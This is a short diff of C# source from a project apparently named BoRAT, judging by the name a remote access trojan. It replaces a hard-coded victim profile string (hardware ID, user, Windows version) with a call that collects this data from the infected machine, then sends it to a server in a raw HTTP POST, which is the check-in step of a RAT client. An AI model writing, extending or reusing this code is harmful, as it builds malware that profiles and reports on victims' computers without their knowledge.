@@ -1,4 +1,5 @@
-﻿using System;
+﻿using BoRAT.Core.Data;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Net;
@@ -19,7 +20,9 @@ namespace BoRAT.Core.Network
             {
                 try
                 {
-                    string data = "HWID|1|barbados|Windows 7|32&1&1";
+                    // Info user
+                    string data = Info.GetInfo();
+
                     // Send
                     string request = 
                         "POST / HTTP/1.1\r\n" +
